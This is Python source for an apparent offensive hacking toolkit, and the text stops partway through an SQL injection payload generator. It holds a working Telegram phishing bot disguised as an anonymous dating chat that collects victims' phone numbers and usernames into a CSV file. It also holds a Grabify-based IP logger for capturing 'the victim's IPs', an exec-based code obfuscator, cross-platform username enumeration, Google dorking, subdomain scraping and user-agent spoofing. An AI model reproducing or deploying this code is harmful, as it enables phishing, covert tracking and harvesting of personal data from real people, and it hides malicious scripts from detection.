import os
import time
from datetime import datetime, timedelta
import re
import socket
import sys
import requests
from bs4 import BeautifulSoup
import phonenumbers
from phonenumbers import geocoder, carrier, timezone
import whois
from pystyle import Anime, Colors, Colorate, Center
import base64
import threading
import string
import random
import html
from urllib.parse import urlparse, urljoin
from tkinter import Tk
from tkinter.filedialog import asksaveasfilename
from telegraph import Telegraph, TelegraphException
from random import choice
from googlesearch import search
import paketlib
import zlib
import marshal
import urllib.request
import telebot
from telebot import types
import csv

telegraph = Telegraph()
telegraph.create_account(short_name='console_app')
MAX_TITLE_LENGTH = 30
def zlb(in_): return zlib.compress(in_)
def b16(in_): return base64.b16encode(in_)
def b32(in_): return base64.b32encode(in_)
def b64(in_): return base64.b64encode(in_)
def mar(in_): return marshal.dumps(compile(in_, '<x>', 'exec'))


def phishing():
    token_bot = input(
        f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter Bot token → ')
    print(
        f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Good! Phising Bot done. You can use your bot.')

    bot = telebot.TeleBot(token_bot)
    bot.delete_webhook()

    waiting_users = []
    chatting_users = {}
    verified_users = {}

    @bot.message_handler(commands=['start'])
    def start_handler(message):
        if message.chat.id in verified_users:
            bot.send_message(message.chat.id,
                             "👋 Приветствую! Теперь вы можете приступить к поиску знакомств! 😋\nОтправьте команду /search чтобы начать.")
        else:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton(
                text='✅ Подтвердить личность', callback_data='verify'))
            bot.send_message(message.chat.id, "👋 Приветствую! Для начала подтвердите свою личность.",
                             reply_markup=markup)

    @bot.callback_query_handler(func=lambda call: call.data == 'verify')
    def verify_handler(call):
        markup = types.ReplyKeyboardMarkup(
            one_time_keyboard=True, resize_keyboard=True)
        button_contact = types.KeyboardButton(
            text="📱 Отправить контакт", request_contact=True)
        markup.add(button_contact)
        bot.send_message(call.message.chat.id, "📞 Пожалуйста, подтвердите свою личность, отправив свой контакт.",
                         reply_markup=markup)

    @bot.message_handler(content_types=['text'])
    def text_handler(message):
        if message.chat.id not in verified_users:
            bot.send_message(
                message.chat.id, "❌ Подтвердите личность, чтобы использовать команду. ❌")
            return
        if message.text == '/search':
            waiting_users.append(message.chat.id)
            bot.send_message(message.chat.id, "⏳ Ожидание собеседника...")
            if len(waiting_users) > 1:
                user1 = waiting_users.pop(0)
                user2 = waiting_users.pop(0)
                chatting_users[user1] = user2
                chatting_users[user2] = user1
                bot.send_message(
                    user1, "🎉 Собеседник найден! Начните с ним диалог.")
                bot.send_message(
                    user2, "🎉 Собеседник найден! Начните с ним диалог.")
        elif message.text == '/stop':
            if message.chat.id in chatting_users:
                partner_id = chatting_users[message.chat.id]
                del chatting_users[message.chat.id]
                del chatting_users[partner_id]
                bot.send_message(partner_id, "❌ Собеседник завершил разговор.")
                start_handler(message)
        else:
            if message.chat.id in chatting_users:
                bot.send_message(chatting_users[message.chat.id], message.text)

    @bot.message_handler(content_types=['contact'])
    def contact_handler(message):
        if message.chat.id not in verified_users:
            verified_users[message.chat.id] = message.contact.phone_number
            with open('users.csv', 'a', newline='', encoding='utf-8') as file:
                writer = csv.writer(file)
                writer.writerow([message.contact.phone_number, message.chat.id, message.from_user.username,
                                 message.from_user.first_name])
            print(
                f'{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} @{message.from_user.username} Подтвердил аккаунт')
            bot.send_message(message.chat.id,
                             "✅ Отлично! Теперь вы можете начать поиск собеседников. Напишите /search для поиска.")

    @bot.message_handler(content_types=['document'])
    def document_handler(message):
        file_info = bot.get_file(message.document.file_id)
        if file_info.file_path.endswith('.exe') or file_info.file_path.endswith('.apk'):
            bot.delete_message(message.chat.id, message.message_id)
            bot.send_message(
                message.chat.id, "🚫 Извините, файлы .exe и .apk запрещены.")

    bot.polling()


def web_crawler():
    def get_page_internet(url):
        try:
            response = urllib.request.urlopen(url)
            return response.read().decode('utf-8')
        except Exception as e:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error accessing {url}: {e}{Color.RESET}")
            return ""

    def get_next_target(page):
        start_link = page.find("<a href=")
        if start_link == -1:
            return None, 0
        start_quote = page.find('"', start_link)
        end_quote = page.find('"', start_quote + 1)
        url = page[start_quote + 1:end_quote]
        return url, end_quote

    def get_all_links(page):
        links = []
        while True:
            url, endpos = get_next_target(page)
            if url:
                links.append(url)
                page = page[endpos:]
            else:
                break
        return links

    def crawl_web(seed, max_pages):
        tocrawl = [seed]
        crawled = []
        while tocrawl and len(crawled) < max_pages:
            url = tocrawl.pop()
            if url not in crawled:
                print(
                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Crawling: {url}{Color.RESET}")
                content = get_page_internet(url)
                if content:
                    links = get_all_links(content)
                    tocrawl.extend(links)
                crawled.append(url)
        return crawled

    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Simple Web Crawler")
    seed = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Enter the seed URL: {Color.RESET}").strip()
    try:
        max_pages = int(input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Enter the maximum number of pages to crawl: {Color.RESET}").strip())
    except ValueError:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid number. Using default value of 5.{Color.RESET}")
        max_pages = 5

    crawled_pages = crawl_web(seed, max_pages)
    print(
        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{LIGHT_RED} Crawled Pages:{Color.RESET}")
    for page in crawled_pages:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} {page}{Color.RESET}")


def obfuscate_file(file_path, method):
    try:
        with open(file_path, encoding='utf-8') as file:
            original_code = file.read()
    except FileNotFoundError:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} File not found!{Color.RESET}")
        return
    except UnicodeDecodeError:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Unable to decode file. Ensure UTF-8 encoding.{Color.RESET}")
        return

    try:
        if method == 1:
            obfuscated_code = f"import marshal;exec(marshal.loads({repr(marshal.dumps(compile(original_code, '<string>', 'exec')))}))"
        elif method == 2:
            zlib_data = zlib.compress(original_code.encode('utf-8'))
            obfuscated_code = f"import zlib;exec(zlib.decompress({repr(zlib_data)}).decode('utf-8'))"
        elif method == 3:
            zlib_data = zlib.compress(marshal.dumps(
                compile(original_code, '<string>', 'exec')))
            base64_data = base64.b64encode(zlib_data)
            obfuscated_code = f"import marshal, zlib, base64;exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64_data)}))))"
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid obfuscation method.{Color.RESET}")
            return
    except Exception as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error during obfuscation: {e}{Color.RESET}")
        return

    output_file = file_path.replace('.py', f'_obfuscated_method{method}.py')
    try:
        with open(output_file, 'w', encoding='utf-8') as file:
            file.write(obfuscated_code)
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscation successful. Saved as {output_file}.{Color.RESET}")
    except Exception as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Error saving file: {e}{Color.RESET}")


def obfuscate_tool():
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Python File Obfuscation Tool{Color.RESET}")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}1{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using Marshal")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}2{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using Zlib")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}3{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using Marshal + Zlib + Base64")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}4{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Obfuscate using all methods")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}0{Color.DARK_GRAY}]{Color.LIGHT_RED} Exit{Color.RESET}")

    choice = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Select an option: {Color.RESET}").strip()

    if choice == "0":
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Exiting...{Color.RESET}")
        return

    file_path = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter the path to the Python file: {Color.RESET}").strip()
    if not os.path.isfile(file_path):
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} File does not exist. Please check the path and try again.{Color.RESET}")
        return
    if choice == "1":
        obfuscate_file(file_path, method=1)
    elif choice == "2":
        obfuscate_file(file_path, method=2)
    elif choice == "3":
        obfuscate_file(file_path, method=3)
    elif choice == "4":
        for method in range(1, 4):
            obfuscate_file(file_path, method=method)
    else:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid option. Please select a valid choice.{Color.RESET}")


def check_username():
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
    }
    platforms_list = [
        'twitter', 'instagram', 'facebook', 'telegram', 'youtube',
        'reddit', 'roblox', 'vkontakte', 'tiktok', 'pinterest',
        'github', 'twitch', 'linkedin', 'snapchat',
        'flickr', 'vimeo', 'mixcloud', 'slideshare', 'imgur',
        'pastebin', 'keybase', 'creativemarket', 'ello',
        'cashme', 'dribbble', 'angel', 'tripadvisor', '500px',
        'blogspot', 'deviantart', 'slack', 'hackerone', 'etsy',
        'hubpages', 'steam', 'codementor', 'newgrounds',
        'okcupid', 'reverbnation', 'plusgoogle', 'houzz',
        'bitbucket', 'zoneh', 'codecademy', 'lastfm', 'trakt',
        'tumblr', 'wordpress', 'disqus', 'spotify', 'wattpad',
        'oldreddit', 'gumroad', 'badoo', 'ifttt', 'contently',
        'skyscanner', 'wikipedia', 'gravatar', 'designspiration',
        'buzzfeed', 'behance', 'bandcamp', 'instructables',
        'scribd', 'foursquare', 'blip', 'medium', 'soundcloud',
        'livejournal', 'patreon', 'dailymotion', 'goodreads',
        'canva', 'flipboard', 'aboutme', 'colourlovers'
    ]
    urls = {
        "twitter": "https://twitter.com/{username}",
        "instagram": "https://www.instagram.com/{username}",
        "facebook": "https://www.facebook.com/{username}",
        "telegram": "https://t.me/{username}",
        "youtube": "https://www.youtube.com/{username}",
        "reddit": "https://www.reddit.com/user/{username}",
        "roblox": "https://www.roblox.com/users/{username}/profile",
        "vkontakte": "https://vk.com/{username}",
        "tiktok": "https://www.tiktok.com/@{username}",
        "pinterest": "https://www.pinterest.com/{username}",
        "github": "https://github.com/{username}",
        "twitch": "https://www.twitch.tv/{username}",
        "linkedin": "https://www.linkedin.com/in/{username}",
        "snapchat": "https://www.snapchat.com/add/{username}",
        "flickr": "https://flickr.com/people/{username}",
        "vimeo": "https://vimeo.com/{username}",
        "mixcloud": "https://mixcloud.com/{username}",
        "slideshare": "https://slideshare.net/{username}",
        "imgur": "https://imgur.com/user/{username}",
        "pastebin": "https://pastebin.com/u/{username}",
        "keybase": "https://keybase.io/{username}",
        "creativemarket": "https://creativemarket.com/{username}",
        "ello": "https://ello.co/{username}",
        "cashme": "https://cash.me/{username}",
        "dribbble": "https://dribbble.com/{username}",
        "angel": "https://angel.co/{username}",
        "tripadvisor": "https://tripadvisor.com/members/{username}",
        "500px": "https://500px.com/{username}",
        "blogspot": "https://{username}.blogspot.com/",
        "deviantart": "https://{username}.deviantart.com/",
        "slack": "https://{username}.slack.com/",
        "hackerone": "https://hackerone.com/{username}",
        "etsy": "https://www.etsy.com/shop/{username}",
        "hubpages": "https://{username}.hubpages.com",
        "steam": "https://steamcommunity.com/id/{username}",
        "codementor": "https://www.codementor.io/{username}",
        "newgrounds": "https://{username}.newgrounds.com/",
        "okcupid": "https://www.okcupid.com/profile/{username}",
        "reverbnation": "https://www.reverbnation.com/{username}",
        "plusgoogle": "https://plus.google.com/{username}",
        "houzz": "https://houzz.com/user/{username}",
        "bitbucket": "https://bitbucket.org/{username}",
        "zoneh": "http://www.zone-h.org/archive/notifier={username}",
        "codecademy": "https://codecademy.com/{username}",
        "lastfm": "https://last.fm/user/{username}",
        "trakt": "https://www.trakt.tv/users/{username}",
        "tumblr": "https://{username}.tumblr.com/",
        "wordpress": "https://{username}.wordpress.com/",
        "disqus": "https://disqus.com/{username}",
        "spotify": "https://open.spotify.com/user/{username}",
        "wattpad": "https://wattpad.com/user/{username}",
        "oldreddit": "http://old.reddit.com/user/{username}",
        "gumroad": "https://www.gumroad.com/{username}",
        "badoo": "https://badoo.com/en/{username}",
        "ifttt": "https://www.ifttt.com/p/{username}",
        "contently": "https://{username}.contently.com",
        "skyscanner": "https://www.trip.skyscanner.com/user/{username}",
        "wikipedia": "https://www.wikipedia.org/wiki/User:{username}",
        "gravatar": "https://en.gravatar.com/{username}",
        "designspiration": "https://www.designspiration.net/{username}",
        "buzzfeed": "https://buzzfeed.com/{username}",
        "behance": "https://www.behance.net/{username}",
        "bandcamp": "https://www.bandcamp.com/{username}",
        "instructables": "https://www.instructables.com/member/{username}",
        "scribd": "https://www.scribd.com/{username}",
        "foursquare": "https://foursquare.com/{username}",
        "blip": "https://blip.fm/{username}",
        "medium": "https://medium.com/@{username}",
        "soundcloud": "https://soundcloud.com/{username}",
        "livejournal": "https://{username}.livejournal.com/",
        "patreon": "https://www.patreon.com/{username}",
        "dailymotion": "https://www.dailymotion.com/{username}",
        "goodreads": "https://www.goodreads.com/{username}",
        "canva": "https://canva.com/{username}",
        "flipboard": "https://flipboard.com/@{username}",
        "aboutme": "https://about.me/{username}",
        "colourlovers": "https://www.colourlovers.com/love/{username}"
    }
    username = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Enter a username to check: {Color.RESET}")
    for platform in platforms_list:
        try:
            url = urls.get(platform).format(username=username)
            response = requests.get(url, headers=headers, timeout=0.5)
            if response.status_code == 200:
                print(
                    f"{Color.GREEN}{platform.capitalize()}: {url} - User found.{Color.RESET}")
            elif response.status_code == 404:
                print(
                    f"{Color.RED}{platform.capitalize()}: {url} - User not found.{Color.RESET}")
            else:
                print(
                    f"{Color.YELLOW}{platform.capitalize()}: {url} - Error {response.status_code}.{Color.RESET}")
        except Exception:
            print(
                f"{Color.BLUE}{platform.capitalize()}: Skipped due to an error.{Color.RESET}")


def telegram_search():
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Telegram Search Tool")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}1{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Search by Telegram Username")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}2{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Search by Telegram Channel")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}3{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Search by Telegram Chat")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}4{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Parse Telegram Channel")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}0{Color.DARK_GRAY}]{Color.LIGHT_RED} Exit")

    choice = input(
        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Select an option: {Color.RESET}").strip()

    def format_result(result):
        if isinstance(result, dict):
            for key, value in result.items():
                label = key.capitalize()
                color = Color.WHITE
                if key == "description":
                    color = Color.LIGHT_GREEN
                elif key == "name":
                    color = Color.LIGHT_BLUE
                elif key == "subscribers":
                    color = Color.LIGHT_PURPLE
                elif key == "image":
                    color = Color.LIGHT_BLUE
                elif key == "tg":
                    color = Color.LIGHT_GREEN
                print(
                    f"{Color.DARK_GRAY}[{color}{label}{Color.DARK_GRAY}]: {Color.WHITE}{value}{Color.RESET}")
        elif isinstance(result, list):
            for idx, item in enumerate(result, 1):
                print(
                    f"{Color.DARK_GRAY}[{Color.LIGHT_GREEN}Item {idx}{Color.DARK_GRAY}]: {Color.WHITE}{item}{Color.RESET}")
        else:
            print(f"{Color.LIGHT_GREEN}{result}{Color.RESET}")

    if choice == "1":
        username = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Username (e.g., @username): {Color.RESET}").strip()
        if username:
            result = paketlib.search.Telegram().TelegramUsername(username)
            print(
                f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Username Search Result:{Color.RESET}")
            format_result(result)
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Username cannot be empty.{Color.RESET}")

    elif choice == "2":
        channel = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Channel (e.g., @channel): {Color.RESET}").strip()
        if channel:
            result = paketlib.search.Telegram().TelegramChannel(channel)
            print(
                f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Channel Search Result:{Color.RESET}")
            format_result(result)
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Channel cannot be empty.{Color.RESET}")

    elif choice == "3":
        chat = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Chat (e.g., @chat): {Color.RESET}").strip()
        if chat:
            result = paketlib.search.Telegram().TelegramChat(chat)
            print(
                f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Chat Search Result:{Color.RESET}")
            format_result(result)
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Chat cannot be empty.{Color.RESET}")

    elif choice == "4":
        channel = input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Enter Telegram Channel to Parse (e.g., @channel): {Color.RESET}").strip()
        if channel:
            result = paketlib.search.Telegram().TelegramCParser(channel)
            print(
                f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Parsed Channel Result:{Color.RESET}")
            format_result(result)
        else:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid input. Channel cannot be empty.{Color.RESET}")

    elif choice == "0":
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Exiting...{Color.RESET}")
        return

    else:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid option. Please select a valid choice.{Color.RESET}")

    input(
        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Press Enter to continue...{Color.RESET}")


def generate_user_agent():
    platforms = [
        "Windows NT 10.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "X11; Ubuntu; Linux x86_64",
        "iPhone; CPU iPhone OS 14_6 like Mac OS X",
        "Android 10; Mobile"
    ]
    browsers = [
        ("Chrome", random.randint(80, 105)),
        ("Firefox", random.randint(85, 105)),
        ("Safari", random.randint(13, 15)),
        ("Edge", random.randint(80, 105))
    ]
    browser, version = choice(browsers)
    platform = choice(platforms)
    if browser == "Safari":
        return f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Version/{version}.0 Safari/537.36"
    elif browser == "Chrome":
        return f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.4472.124 Safari/537.36"
    elif browser == "Firefox":
        return f"Mozilla/5.0 ({platform}; rv:{version}.0) Gecko/20100101 Firefox/{version}.0"
    elif browser == "Edge":
        return f"Mozilla/5.0 ({platform}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.4472.124 Safari/537.36 Edg/{version}.0"


def google_osint():
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Google OSINT Search")
    print(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter a Google Dork query to refine your search.")

    query = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter your search query: {Color.RESET}").strip()
    if not query:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No input provided! Please try again.{Color.RESET}")
        return

    lang = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter the language code (e.g., en for English, ru for Russian, es for Spanish): {Color.RESET}").strip() or "en"

    try:
        amount = int(input(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter the number of websites to display: {Color.RESET}"))
        if amount <= 0:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Please enter a positive number.{Color.RESET}")
            return
    except ValueError:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Invalid number entered. Please enter a valid integer.{Color.RESET}")
        return

    print(
        f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Searching for information...{Color.RESET}\n")

    try:
        results_found = 0
        for result in search(query, lang=lang, num=10, start=0, stop=amount, pause=2):
            results_found += 1
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} [{results_found}] {Color.LIGHT_BLUE}{result}{Color.RESET}")
            time.sleep(0.1)

        if results_found == 0:
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No results found. Please refine your search query or try again.{Color.RESET}")

    except KeyboardInterrupt:
        print(
            f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} User interruption detected. Exiting...{Color.RESET}")
    except Exception as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} An error occurred: {e}{Color.RESET}")


def logger_ip():
    while True:
        print(
            f"\n{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} Main Menu")
        print(f"{Color.LIGHT_GREEN}1. Create an article{Color.RESET}")
        print(f"{Color.LIGHT_GREEN}2. FAQ{Color.RESET}")
        print(f"{Color.LIGHT_GREEN}3. Exit{Color.RESET}")
        choice = input(
            f"{Color.LIGHT_BLUE}Choose an option: {Color.RESET}").strip()

        if choice == '1':
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Creating an article...")
            while True:
                title = input(
                    f"{Color.LIGHT_BLUE}Enter the article title (up to 30 characters): {Color.RESET}").strip()
                if len(title) > MAX_TITLE_LENGTH:
                    print(
                        f"{Color.DARK_RED}The title is too long. Please try again.{Color.RESET}")
                    continue
                break

            content = input(
                f"{Color.LIGHT_BLUE}Enter the article content: {Color.RESET}").strip()

            while True:
                link = input(
                    f"{Color.LIGHT_BLUE}Enter the Grabify logger link (ending with .jpg or .png): {Color.RESET}").strip()
                if link.startswith("https://grabify.link/") and (link.endswith(".jpg") or link.endswith(".png")):
                    break
                else:
                    print(
                        f"{Color.DARK_RED}Invalid link. Make sure it starts with https://grabify.link/ and ends with .jpg or .png.{Color.RESET}")

            while True:
                try:
                    num_links = int(input(
                        f"{Color.LIGHT_BLUE}How many times do you want to add the link to the article? {Color.RESET}").strip())
                    if num_links <= 0:
                        raise ValueError
                    break
                except ValueError:
                    print(
                        f"{Color.DARK_RED}Please enter a valid positive number.{Color.RESET}")

            full_content = f"<p>{content}</p>"
            for _ in range(num_links):
                full_content += f'<img src="{link}"/>'

            try:
                response = telegraph.create_page(
                    title=title,
                    html_content=full_content
                )
                if 'url' in response:
                    print(
                        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_GREEN} Article created! Link: {response['url']}{Color.RESET}")
                else:
                    print(
                        f"{Color.DARK_RED}Error while creating the article.{Color.RESET}")
            except TelegraphException as e:
                print(f"{Color.DARK_RED}Telegraph API error: {e}{Color.RESET}")

        elif choice == '2':
            print(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_BLUE} FAQ...")
            print(
                f"{Color.LIGHT_GREEN}Create a logger link at grabify.link. Ensure it ends with .png or .jpg.{Color.RESET}")
            print(
                f"{Color.LIGHT_GREEN}The victim's IPs will be displayed on the Grabify website. Detailed tutorial: https://telegra.ph/Tutor-po-sozdaniyu-ssylki-07-21{Color.RESET}")

        elif choice == '3':
            print(f"{Color.DARK_RED}Exiting the program...{Color.RESET}")
            break

        else:
            print(f"{Color.DARK_RED}Invalid choice. Please try again.{Color.RESET}")


def find_subdomains():
    url = input(
        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Enter the target URL: ").strip()
    subdomains = []
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'lxml')
        for sd in soup.find_all('a', href=True):
            href = sd['href']
            absolute_url = urljoin(url, href)
            parsed_url = urlparse(absolute_url)
            domain_parts = parsed_url.netloc.split('.')
            if len(domain_parts) > 2:
                full_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
                subdomains.append(full_url)
        subdomains = sorted(subdomains)
        if subdomains:
            for subdomain in subdomains:
                print(
                    f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.RESET} " + subdomain)
            save_choice = input(
                f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Do you want to save the subdomains to a file? (yes/no): ").strip().lower()
            if save_choice == 'yes':
                root = Tk()
                root.withdraw()
                file_name = asksaveasfilename(defaultextension=".txt", filetypes=[
                                              ("laitoxx Text files", "*.txt")])
                if file_name:
                    with open(file_name, 'w') as file:
                        for subdomain in subdomains:
                            file.write(subdomain + '\n')
                    print(
                        f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} Subdomains saved to: {os.path.abspath(file_name)}")
        else:
            print(
                "{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.LIGHT_RED} No subdomains found.")
    except requests.exceptions.RequestException as e:
        print(
            f"{Color.DARK_GRAY}[{Color.DARK_RED}⛧{Color.DARK_GRAY}]{Color.DARK_RED} Error fetching {url}: {e}")


def generate_sql_payloads(num_payloads=5, payload_type='scan_payload'):
    def generate_random_string(length):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    scan_templates = [
        f"' OR {generate_random_string(6)} = {generate_random_string(6)} -- ",
        f"' OR '{generate_random_string(6)}' = 'invalid' /* ",
        f"' OR {generate_random_string(6)} = '",
        f"' /* comment */ OR '{generate_random_string(6)}' = '1' -- ",
        f"' OR '' = '{generate_random_string(6)}' -- ",
        f"' AND {generate_random_string(6)} = {generate_random_string(6)} -- ",
        f"' OR {generate_random_string(6)} = 'valid' -- ",
        f"' UNION SELECT {generate_random_string(6)} FROM users -- ",
        f"' AND (SELECT COUNT(*) FROM {generate_random_string(6)}) > 0 -- ",
        f"' OR EXISTS (SELECT 1 FROM {generate_random_string(6)} WHERE {generate_random_string(6)} = '1') -- ",
